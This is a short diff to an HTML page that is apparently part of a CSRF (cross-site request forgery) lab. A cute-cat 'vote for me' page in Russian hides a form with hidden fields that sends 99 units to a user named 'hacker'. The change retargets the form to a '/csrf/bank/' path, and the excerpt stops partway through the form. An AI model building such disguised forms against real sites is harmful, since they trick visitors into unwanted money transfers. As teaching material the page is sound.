@@ -7,7 +7,7 @@
 <body>
 	<img src="https://proprikol.ru/wp-content/uploads/2020/08/krasivye-kartinki-kotikov-17.jpg" alt="Классный котик">
 	<p>Я такой милый котик! Проголосуйте за меня, пожалуйста ^т^!</p>
-	<form action="/bank.php" method="post">
+	<form action="/csrf/bank/" method="post">
 		<input type="hidden" name="user" value="hacker">
 		<input type="hidden" name="ammount" value="99">
 		<input type="hidden" name="action" value="send">
